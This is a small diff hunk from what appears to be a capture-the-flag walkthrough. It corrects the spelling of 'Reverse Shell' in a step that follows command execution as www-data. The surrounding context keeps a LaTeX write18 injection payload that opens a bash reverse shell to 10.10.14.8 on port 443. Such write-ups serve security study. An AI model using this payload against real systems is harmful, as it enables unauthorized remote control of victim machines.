@@ -690,7 +690,7 @@ Perfect!! We are `executing commands` as the `www-data` user:
 
 <br />
 
-Once we have a `RCE`, try to establish a `Reverse Shel`l to gain acces to the `victim machine`:
+Once we have a `RCE`, try to establish a `Reverse Shell` to gain acces to the `victim machine`:
 
 - Payload -> `\immediate\write18{bash -c 'bash -i >%26 /dev/tcp/10.10.14.8/443 0>%261'}`
 
